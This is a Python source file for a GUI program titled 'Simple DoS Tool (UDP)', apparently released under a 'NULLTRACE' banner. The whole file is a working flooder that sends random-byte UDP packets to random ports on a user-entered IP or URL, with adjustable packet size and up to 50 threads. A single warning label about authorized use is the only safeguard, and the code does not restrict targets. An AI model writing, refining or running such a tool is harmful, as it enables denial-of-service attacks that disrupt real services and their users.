import socket
import threading
import tkinter as tk
import random
from urllib.parse import urlparse
import requests
import time

running = False
packet_count = 0
threads = []
lock = threading.Lock()

def is_site_reachable(target):
    try:
        parsed_url = urlparse(target)
        if not parsed_url.scheme:
            target = "http://" + target
        response = requests.head(target, timeout=5)
        return response.status_code == 200
    except:
        return False

def start_attack(server, label, error_label, pkt_size, thread_count):
    global running, packet_count, threads
    if not server.strip():
        error_label.config(text="Please enter a server IP or URL!")
        return

    error_label.config(text="")

    if any(c.isalpha() for c in server):
        if not is_site_reachable(server):
            error_label.config(text="Server site is not reachable!")
            return
        else:
            server = urlparse(server if "://" in server else "http://" + server).hostname
            if not server:
                error_label.config(text="Invalid URL entered!")
                return

    running = True
    packet_count = 0
    threads = []

    def attack_thread():
        global packet_count
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(pkt_size)
        while running:
            try:
                port = random.randint(1, 65535)
                sock.sendto(data, (server, port))
                with lock:
                    packet_count += 1
            except:
                break

    for _ in range(thread_count):
        t = threading.Thread(target=attack_thread, daemon=True)
        threads.append(t)
        t.start()

    def update_label():
        if running:
            with lock:
                label.config(text=f"Packets Sent: {packet_count}")
            label.after(100, update_label)  # update every 100 ms

    update_label()

def stop_attack():
    global running
    running = False

# GUI Setup
window = tk.Tk()
window.title("Simple DoS Tool (UDP) - Optimized")
window.geometry("700x650")
window.configure(bg="black")

ascii_art = r"""
__        _______      _    ____  _____  
\ \      / / ____|    / \  |  _ \| ____|  
 \ \ /\ / /|  _|     / _ \ | |_) |  _|    
  \ V  V / | |___   / ___ \|  _ <| |___   
   \_/\_/  |_____| /_/   \_\_| \_\_____|  

 _   _ _   _ _     _   _____ ____      _    ____ _____  
| \ | | | | | |   | | |_   _|  _ \    / \  / ___| ____| 
|  \| | | | | |   | |   | | | |_) |  / _ \| |   |  _|   
| |\  | |_| | |___| |___| | |  _ <  / ___ \ |___| |___  
|_| \_|\___/|_____|_____|_| |_| \_\/_/   \_\____|_____|
"""

ascii_label = tk.Label(window, text=ascii_art, font=("Courier", 8), justify="left", fg="red", bg="black")
ascii_label.pack()

# WARNING LABEL ADDED HERE
warning_text = (
    "WARNING: Use this tool ONLY on servers you own or have permission to test.\n"
    "Unauthorized use against others is illegal and unethical."
)
warning_label = tk.Label(
    window,
    text=warning_text,
    font=("Arial", 12, "bold"),
    fg="yellow",
    bg="black",
    wraplength=650,
    justify="center",
)
warning_label.pack(pady=(10, 20))

ip_frame = tk.Frame(window, bg="black")
ip_frame.pack(pady=10)

tk.Label(ip_frame, text="Server IP or URL:", fg="red", bg="black", font=("Arial", 10)).grid(row=0, column=0)
ip_entry = tk.Entry(ip_frame, bg="black", fg="red", insertbackground="red", width=40)
ip_entry.grid(row=0, column=1)

pkt_size_frame = tk.Frame(window, bg="black")
pkt_size_frame.pack(pady=10)
tk.Label(pkt_size_frame, text="Packet Size (bytes):", fg="red", bg="black", font=("Arial", 10)).pack(side="left")
pkt_size_slider = tk.Scale(pkt_size_frame, from_=1, to=65507, orient="horizontal", bg="black", fg="red", length=400)
pkt_size_slider.set(1024)
pkt_size_slider.pack(side="left")

thread_frame = tk.Frame(window, bg="black")
thread_frame.pack(pady=10)
tk.Label(thread_frame, text="Number of Threads:", fg="red", bg="black", font=("Arial", 10)).pack(side="left")
thread_slider = tk.Scale(thread_frame, from_=1, to=50, orient="horizontal", bg="black", fg="red", length=400)
thread_slider.set(10)
thread_slider.pack(side="left")

packet_label = tk.Label(window, text="Packets Sent: 0", font=("Arial", 12), fg="red", bg="black")
packet_label.pack(pady=5)

error_label = tk.Label(window, text="", font=("Arial", 10), fg="red", bg="black")
error_label.pack()

start_btn = tk.Button(
    window,
    text="Start",
    command=lambda: start_attack(
        ip_entry.get(),
        packet_label,
        error_label,
        pkt_size_slider.get(),
        thread_slider.get(),
    ),
    bg="darkgreen",
    fg="white",
    width=15,
)
start_btn.pack(pady=5)

stop_btn = tk.Button(window, text="Stop", command=stop_attack, bg="darkred", fg="white", width=15)
stop_btn.pack(pady=5)

window.mainloop()